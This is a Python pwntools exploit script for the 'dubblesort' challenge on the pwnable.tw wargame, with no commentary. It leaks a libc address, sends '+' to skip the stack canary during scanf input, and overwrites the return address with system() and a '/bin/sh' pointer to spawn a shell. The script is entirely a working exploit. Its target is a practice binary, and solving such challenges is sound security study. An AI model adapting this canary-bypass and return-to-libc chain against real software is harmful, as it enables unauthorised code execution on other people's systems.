from pwn import *
import sys,os
context.arch = 'i386'
print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('chall.pwnable.tw',10101)
else:
    #r = remote('localhost',8888)
    r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})

off = 0xf771f000 - 0xf756f000

pad = 'x'*25
r.send(pad)
r.recvuntil('Hello ' + pad)
info = r.recv(3)
#libc = u32(info.rjust(4,'\0')) - 0x1b0000
libc = u32(info.rjust(4,'\0')) - off
#dubblesort
print hex(libc)

#/bin//sh string
sh_addr = libc + 0x00158e8b
sh_addr = libc + 0x001562f5 
#rop gadget
inc_eax = libc + 0x00007eec    #   0x00007eec : inc eax ; ret
pop_ebx = libc + 0x00018395    #   0x00018395 : pop ebx ; ret
system =  libc + 0x0003a940
dec_ecx = libc + 0x00045d12    #   0x00045d12 : dec ecx ; ret
    
num = 34
r.recvuntil('How many numbers do you what to sort')
#r.interactive()
r.sendline(str(num))
for i in range(num):
    if i == 24:
        msg = '+'
    elif i == 32:
        msg = str(system)
    elif i == 33:
        msg = str(sh_addr)
    elif i >= 25:
        msg = str(libc)
    else:
        msg = str(i)
    r.recvuntil('Enter')
    r.sendline(msg)
    print i
r.interactive()

